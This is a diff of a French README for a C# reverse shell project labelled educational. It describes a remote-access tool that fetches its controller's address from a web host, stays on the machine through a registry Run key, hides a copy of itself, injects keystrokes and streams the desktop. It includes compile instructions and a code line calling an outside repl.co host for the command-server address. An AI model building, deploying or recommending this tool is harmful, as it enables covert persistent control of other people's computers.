@@ -3,7 +3,7 @@
 
 Ce projet est une démonstration d'une reverse shell écrite en C#. Il s'agit d'un outil puissant pour la gestion à distance des systèmes, utilisé à des fins éducatives et de recherche.
 
-####Points clés du code
+#### Points clés du code
 
 1. Connexion réseau : Le code utilise la classe TcpClient pour établir une connexion réseau avec un serveur distant. L'adresse IP et le port du serveur sont récupérés à partir d'un serveur web distant.
 
@@ -16,12 +16,12 @@ Ce projet est une démonstration d'une reverse shell écrite en C#. Il s'agit d'
 5. Persistante : Le code tente de rendre la reverse shell persistante en ajoutant une entrée au registre Windows pour exécuter le programme au démarrage de la session de l'utilisateur. Il copie également le fichier exécutable dans un répertoire caché.
 
 
-####Utilisation
+#### Utilisation
 Pour télécharger .Net 7.0 en version portable, voir ici : https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-7.0.306-windows-x64-binaries
 
 lien directe : https://download.visualstudio.microsoft.com/download/pr/3c443568-43b0-40b1-bb5c-3a6d8cd31876/e7d6c5b176b1c985a5f972dbf2c721b3/dotnet-sdk-7.0.306-win-x64.zip
 
-#####compiler le client : 
+##### compiler le client : 
 Pour commencer, changer l'url à ligne 158 de client\Program.cs
 ```
 string ip_port = new WebClient().DownloadString("https://outofhere.example.repl.co/");  // replace by YOUR WebServer url
@@ -48,17 +48,17 @@ ex :
 ```
 1.2.3.4:8080
 ```
-###Démonstration
+### Démonstration
 
-####Pour information, les vidéos ont été enregistrées sur la même machine avec la protection en temps réel activée [sans envoyer d'échantillons], mais c'est bien CLIENT.EXE qui effectue les actions.
+#### Pour information, les vidéos ont été enregistrées sur la même machine avec la protection en temps réel activée [sans envoyer d'échantillons], mais c'est bien CLIENT.EXE qui effectue les actions.
 
-#####- Reverse Shell Si vous ne le voyez pas : https://github.0xsql.repl.co/reverse_shell.gif
+##### - Reverse Shell Si vous ne le voyez pas : https://github.0xsql.repl.co/reverse_shell.gif
 
-#####MessageBox et SendKeys
+##### MessageBox et SendKeys
 Si vous ne le voyez pas : https://github.0xsql.repl.co/send_keys_and_msgb.gif
 Exemple de commande msgb>/Votre Message SKS>/Vos Clés
 
-#####remote-desktop
+##### remote-desktop
 Si vous ne le voyez pas : https://github.0xsql.repl.co/remote-desktop.gif
 Pour démarrer le bureau à distance, exécutez server-remote-video.exe dans remote-video\server-remote-video\server\bin\Debug et exécutez la commande sur server.exe : remote-desktop>/:8081
 
